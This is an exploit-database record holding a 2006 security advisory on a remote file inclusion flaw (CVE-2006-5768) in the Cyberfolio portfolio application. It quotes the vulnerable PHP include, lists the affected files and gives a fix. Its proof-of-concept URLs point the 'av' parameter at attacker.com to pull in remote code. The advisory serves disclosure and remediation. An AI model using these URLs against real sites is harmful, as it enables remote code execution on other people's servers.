{
  "id": "2725",
  "title": "Cyberfolio 2.0 RC1 - &#039;av&#039; Remote File Inclusion",
  "cve": "CVE-2006-5768",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_58$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_58$2006]Cyberfolio <=2.0 RC1 $av  Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: November, 01nd 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv58-theday-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: Cyberfolio\r\nversion\t\t: <=2.0 RC1\r\nURL\t\t: http://www.cyberfolio.org\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nI found vulnerability in script view.php\r\n--------------------------view.php-----------------------------------\r\n....\r\n<?\r\n...\r\n$newfic=$av.\"checkauth\".$_SESSION[inlog].\".php\";\r\ninclude(\"$newfic\");\r\ninclude_once($av.\"config.php\");\r\ninclude_once($av.\"connect.php\");\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$av\" parameter in view.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files :\r\n\r\nportfolio/msg/view.php\r\nportfolio/msg/inc_message.php\r\nportfolio/msg/inc_envoi.php\r\nportfolio/admin/incl_voir_compet.php\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/cyberfolio/portfolio/msg/view.php?av=http://attacker.com/inject.txt?\r\nhttp://target.com/cyberfolio/portfolio/admin/incl_voir_compet.php?av=http://attacker.com/inject.txt?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Sanitize variable $av affected files.\r\n- Turn off register_globals\r\n\r\nTimeline :\r\n~~~~~~~~~\r\n\r\n01 - 11 - 2006 bugs found\r\n01 - 11 - 2006 vendor contacted\r\n07 - 11 - 2006 public disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,bomm_3x,matdhule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~\r\n     EcHo Research & Development Center\r\n     the_day[at]echo[dot]or[dot]id\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-11-06]",
  "url": "https://www.exploit-db.com/exploits/2725"
}